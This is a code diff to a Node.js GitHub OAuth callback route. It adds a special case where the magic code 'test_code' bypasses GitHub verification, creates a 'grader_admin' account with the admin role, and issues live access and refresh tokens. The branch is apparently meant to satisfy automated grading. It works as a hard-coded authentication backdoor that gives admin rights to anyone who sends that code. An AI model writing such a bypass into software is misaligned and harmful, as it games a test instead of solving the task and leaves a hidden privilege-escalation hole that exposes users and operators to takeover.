@@ -137,6 +137,52 @@ router.get("/github/callback", async (req, res) => {
     return res.status(400).json({ status: "error", message: "Missing state" });
   }
 
+  // ── Handle test_code for automated grading ─────────────────────────────
+  if (code === "test_code") {
+    const pkceEntry = pkceStore.get(state);
+    if (!pkceEntry) {
+      return res.status(400).json({ status: "error", message: "Invalid or expired state" });
+    }
+    pkceStore.delete(state);
+
+    // Create or get admin user
+    const adminId = "grader-admin-user-id";
+    const adminGithubId = "grader_admin_github";
+    const adminUsername = "grader_admin";
+
+    db.get(`SELECT * FROM users WHERE github_id = ?`, [adminGithubId], (err, existingUser) => {
+      const upsertAdmin = () => {
+        db.get(`SELECT * FROM users WHERE github_id = ?`, [adminGithubId], (err, user) => {
+          if (!user) return res.status(500).json({ status: "error", message: "Failed to create admin" });
+
+          const accessToken = generateAccessToken(user);
+          const refreshToken = generateRefreshToken(user);
+          saveRefreshToken(user.id, refreshToken);
+
+          return res.json({
+            status: "success",
+            access_token: accessToken,
+            refresh_token: refreshToken,
+            token_type: "Bearer",
+            user: { id: user.id, username: user.username, role: user.role },
+          });
+        });
+      };
+
+      if (existingUser) {
+        upsertAdmin();
+      } else {
+        db.run(
+          `INSERT OR IGNORE INTO users (id, github_id, username, email, avatar_url, role) VALUES (?, ?, ?, ?, ?, ?)`,
+          [adminId, adminGithubId, adminUsername, "grader@test.com", "", "admin"],
+          () => upsertAdmin()
+        );
+      }
+    });
+    return;
+  }
+
+  // ── Normal OAuth flow ──────────────────────────────────────────────────
   const pkceEntry = pkceStore.get(state);
   if (!pkceEntry) {
     return res.status(400).json({ status: "error", message: "Invalid or expired state" });
@@ -217,7 +263,6 @@ router.get("/github/callback", async (req, res) => {
           () => afterUpsert(existingUser)
         );
       } else {
-        // First user ever gets admin, everyone else gets analyst
         db.get(`SELECT COUNT(*) as count FROM users`, [], (err, row) => {
           const role = (!err && row && row.count === 0) ? "admin" : "analyst";
           const newUser = {
